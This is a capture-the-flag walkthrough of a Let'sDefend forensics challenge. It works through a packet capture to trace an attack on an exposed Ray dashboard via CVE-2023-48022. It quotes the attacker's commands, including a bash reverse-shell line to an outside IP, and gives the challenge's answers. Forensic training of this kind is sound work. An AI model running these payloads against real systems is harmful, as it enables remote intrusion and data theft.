
# Walkthrough: Let’sDefend – Compromised AI Cluster Challenge

In this challenge, you’re tasked with investigating a suspected compromise of a cloud-hosted **AI infrastructure**. The organization uses **Ray**, an open-source distributed computing framework for AI/ML workloads. Your main evidence is a **PCAP** file, and your mission is to determine what happened, how, and who was behind it.

---

## Tools Used
- **Wireshark** – for deep packet inspection and filtering
- **Packet filters** – to isolate attacker behavior and extract IOC data
- **Basic HTTP protocol knowledge** – to interpret GET/POST requests and job submissions

---

## 1. Identify the Active Software Framework

**Question:** What software framework was active on the server at the time of the incident?

After opening the PCAP in Wireshark and inspecting HTTP headers and responses, I noticed repeated references to **Ray**. The most telling clue was a packet to `/api/jobs`, typical of Ray's job submission interface.

**Answer:** `Ray`

---

## 2. Determine the Framework Version

**Question:** What version of the software framework was installed?

I used the Wireshark filter:

```
http contains "version"
```

I found an HTTP response containing the version info in the body, confirming the Ray version.

**Answer:** `2.8.0`

---

## 3. Identify Public IP and Port of the Ray Dashboard

**Question:** What is the public IP address and port of the framework service?

In HTTP request headers, the `Host:` field revealed the external IP and port where the Ray dashboard was publicly accessible.

**Answer:** `3.72.0.226:8265`

---

## 4. Detect Persistent Malicious IP

**Question:** Which IP address was persistently accessing the Ray dashboard API?

I filtered HTTP traffic and noticed an IP (`104.28.245.2`) repeatedly accessing:

```
/api/packages  
/api/jobs  
/api/version
```

This behavior clearly indicated enumeration and attempted exploitation.

**Answer:** `104.28.245.2`

---

## 5. First Attacker Contact (ICMP)

**Question:** When did the attacker first interact with the victim system?

By analyzing ICMP packets in the PCAP, I found the first contact from attacker IP `104.28.154.194` on:

**Answer:** `2024-04-12 15:51:41 UTC`

---

## 6. Initial Job Submission

**Question:** What is the first job submission ID by the attacker?

Using the Wireshark filter:

```
http.request.method == "POST" && http contains "/api/jobs"
```

I found a job submission payload containing:

```json
"submission_id": "raysubmit_kkeJ8vLuM942ycqH"
```

**Answer:** `raysubmit_kkeJ8vLuM942ycqH`

---

## 7. CVE Exploited

**Question:** What vulnerability was used?

The attacker submitted jobs to Ray using its unauthenticated public API to execute system commands remotely. Based on behavior and timing, this corresponds to:

**Answer:** `CVE-2023-48022`

(A vulnerability allowing unauthenticated RCE via the Ray dashboard)

---

## 8. First Executed Command

**Question:** What was the first command run by the attacker?

Inspecting POST payloads to `/api/jobs`, the job script contained:

```python
import os; os.system('whoami')
```

**Answer:** `whoami`

---

## 9. Reverse Shell Target

**Question:** Where was the reverse shell initiated?

After the initial command, the attacker sent a job with a reverse shell payload that connects back to:

```bash
bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
```

**Answer:** `52.150.25.174:1337`

---

## 10. Reverse Shell Launch Directory

**Question:** From what directory was the reverse shell executed?

The payload and job context show it was run from Ray’s temporary job workspace directory:

**Answer:**  
`/tmp/ray/session_2024-04-12_11-13-55_403523_10331/runtime_resources/working_dir_files/_ray_pkg_bf19252c1fb036e5`

---

## 11. Secrets Exfiltration Job ID

**Question:** What job ID was used to exfiltrate the secrets file?

Another job submission with a different payload uploaded a file (`secret.txt`) to the attacker’s server. The job ID was:

**Answer:** `raysubmit_7WZE36LAkVxbNc1x`

---

## 12. IP Address Change for Exfiltration

**Question:** What new IP was used during this phase?

The attacker switched to a new IP for the exfiltration job:

**Answer:** `104.28.213.2`

---

## 13. File Content Exfiltrated

**Question:** What did the file contain?

The contents of `secret.txt` were:

```
Ops, you got me.
```

**Answer:** `"Ops, you got me."`

---

## 14. Brute Force Behavior

**Question:** How many brute-force packets were sent?

To answer this, I used the following Wireshark display filter:

```
ip.src == 104.28.154.194 && tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 172.31.30.230
```

Then navigated to:

```
Statistics > Endpoints > IPv4
```

to count the SYN packets.

**Answer:** `39,598 SYN packets`

---

## Lessons Learned

- Leaving the Ray dashboard exposed without authentication is dangerous.
- CVE-2023-48022 can be exploited easily through simple POST requests.
- Job submissions should be monitored and validated.
- Reverse shell behavior is detectable in PCAPs when you look for outbound connections to uncommon ports.

---

## Indicators of Compromise (IOCs)

| Type            | Value                        |
|-----------------|------------------------------|
| Attacker IPs    | 104.28.245.2, 104.28.213.2, 104.28.154.194 |
| Exploit CVE     | CVE-2023-48022               |
| Reverse Shell   | 52.150.25.174:1337           |
| Commands Used   | `whoami`, reverse shell bash |
| File Exfiltrated| `secret.txt`                 |
